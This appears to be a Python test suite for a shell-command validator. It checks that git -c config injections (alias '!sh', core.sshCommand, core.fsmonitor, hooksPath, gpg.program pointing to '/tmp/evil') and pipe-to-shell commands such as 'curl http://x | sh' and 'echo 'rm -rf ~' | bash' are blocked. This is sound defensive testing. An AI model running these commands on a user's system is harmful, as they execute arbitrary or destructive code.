"""Top-level under-block fixes: pipe-to-shell + git -c exec (security)."""

from schlock.core.rules import RiskLevel
from schlock.core.validator import validate_command


class TestDangerousGitConfigHelper:
    def test_alias_with_bang_is_dangerous(self):
        from schlock.core.substitution import dangerous_git_config

        assert dangerous_git_config(["-c", "alias.x=!sh", "status"]) is not None

    def test_alias_without_bang_is_safe(self):
        from schlock.core.substitution import dangerous_git_config

        assert dangerous_git_config(["-c", "alias.x=status", "status"]) is None

    def test_ssh_command_is_dangerous(self):
        from schlock.core.substitution import dangerous_git_config

        assert dangerous_git_config(["-c", "core.sshCommand=pwn", "clone", "u"]) is not None

    def test_attached_c_form_is_dangerous(self):
        from schlock.core.substitution import dangerous_git_config

        assert dangerous_git_config(["-ccore.pager=sh", "log"]) is not None

    def test_benign_config_is_safe(self):
        from schlock.core.substitution import dangerous_git_config

        assert dangerous_git_config(["-c", "user.name=x", "commit"]) is None

    def test_no_dash_c_is_safe(self):
        from schlock.core.substitution import dangerous_git_config

        assert dangerous_git_config(["status"]) is None

    def test_fsmonitor_is_dangerous(self):
        from schlock.core.substitution import dangerous_git_config

        assert dangerous_git_config(["-c", "core.fsmonitor=/tmp/evil", "status"]) is not None

    def test_hooks_path_is_dangerous(self):
        from schlock.core.substitution import dangerous_git_config

        assert dangerous_git_config(["-c", "core.hooksPath=/tmp/h", "commit"]) is not None

    def test_sequence_editor_is_dangerous(self):
        from schlock.core.substitution import dangerous_git_config

        assert dangerous_git_config(["-c", "sequence.editor=evil", "rebase", "-i", "HEAD~2"]) is not None

    def test_gpg_program_is_dangerous(self):
        from schlock.core.substitution import dangerous_git_config

        assert dangerous_git_config(["-c", "gpg.program=/tmp/evil", "commit", "-S"]) is not None

    def test_askpass_is_dangerous(self):
        from schlock.core.substitution import dangerous_git_config

        assert dangerous_git_config(["-c", "core.askPass=/tmp/evil", "clone", "u"]) is not None


class TestTopLevelGitC:
    def test_alias_bang_blocks(self):
        assert validate_command("git -c alias.x=!sh status").risk_level == RiskLevel.BLOCKED

    def test_ssh_command_blocks(self):
        assert validate_command("git -c core.sshCommand=pwn clone https://x").risk_level == RiskLevel.BLOCKED

    def test_benign_git_c_not_blocked(self):
        assert validate_command("git -c user.name=x commit -m y").risk_level != RiskLevel.BLOCKED

    def test_plain_git_status_not_blocked(self):
        assert validate_command("git status").risk_level != RiskLevel.BLOCKED

    def test_alias_without_bang_not_blocked(self):
        assert validate_command("git -c alias.x=status status").risk_level != RiskLevel.BLOCKED

    def test_hooks_path_blocks_top_level(self):
        assert validate_command("git -c core.hooksPath=/tmp/h status").risk_level == RiskLevel.BLOCKED

    def test_fsmonitor_blocks_top_level(self):
        assert validate_command("git -c core.fsmonitor=/tmp/evil status").risk_level == RiskLevel.BLOCKED


class TestReadsStdinAsProgram:
    def _f(self):
        from schlock.core.parser import _reads_stdin_as_program

        return _reads_stdin_as_program

    def test_bare_interpreter_reads_stdin(self):
        assert self._f()("bash", []) is True
        assert self._f()("python3", []) is True

    def test_script_path_is_exempt(self):
        assert self._f()("bash", ["app.sh"]) is False
        assert self._f()("python3", ["app.py"]) is False

    def test_inline_c_is_exempt(self):
        assert self._f()("bash", ["-c", "echo hi"]) is False
        assert self._f()("python3", ["-c", "print(1)"]) is False

    def test_attached_inline_c_is_exempt(self):
        assert self._f()("bash", ["-cecho hi"]) is False

    def test_perl_ruby_node_e_is_exempt(self):
        assert self._f()("perl", ["-e", "code"]) is False
        assert self._f()("node", ["-e", "code"]) is False

    def test_python_m_is_exempt(self):
        assert self._f()("python3", ["-m", "http.server"]) is False

    def test_bash_dash_e_is_NOT_exempt(self):
        assert self._f()("bash", ["-e"]) is True

    def test_bash_dash_m_is_NOT_exempt(self):
        assert self._f()("bash", ["-m"]) is True

    def test_explicit_stdin_dash_is_dangerous(self):
        assert self._f()("bash", ["-s"]) is True
        assert self._f()("python3", ["-"]) is True

    def test_neutral_flag_then_script_is_exempt(self):
        assert self._f()("python3", ["-u", "app.py"]) is False


class TestTopLevelPipeToShell:
    def test_date_pipe_bash_blocks(self):
        assert validate_command("date | bash").risk_level == RiskLevel.BLOCKED

    def test_echo_payload_pipe_bash_blocks(self):
        assert validate_command("echo 'rm -rf ~' | bash").risk_level == RiskLevel.BLOCKED

    def test_cat_pipe_sh_blocks(self):
        assert validate_command("cat x | sh").risk_level == RiskLevel.BLOCKED

    def test_cat_pipe_python3_blocks(self):
        assert validate_command("cat x | python3").risk_level == RiskLevel.BLOCKED

    def test_pipe_perl_blocks(self):
        assert validate_command("foo | perl").risk_level == RiskLevel.BLOCKED

    # --- must NOT block (false-positive guards) ---
    def test_ls_grep_not_blocked(self):
        assert validate_command("ls | grep x").risk_level != RiskLevel.BLOCKED

    def test_pipe_cat_not_blocked(self):
        assert validate_command("git log | cat").risk_level != RiskLevel.BLOCKED

    def test_pipe_python_script_not_blocked(self):
        assert validate_command("cat data | python3 app.py").risk_level != RiskLevel.BLOCKED

    def test_pipe_python_dash_c_not_blocked(self):
        assert validate_command("echo x | python3 -c 'print(1)'").risk_level != RiskLevel.BLOCKED

    def test_pipe_bash_dash_c_not_blocked(self):
        assert validate_command("foo | bash -c 'echo hi'").risk_level != RiskLevel.BLOCKED

    def test_xargs_not_treated_as_shell_sink(self):
        assert validate_command("ls | xargs rm -i").risk_level != RiskLevel.BLOCKED

    # --- regression: existing curl|sh detection intact ---
    def test_curl_pipe_sh_still_blocks(self):
        assert validate_command("curl http://x | sh").risk_level == RiskLevel.BLOCKED
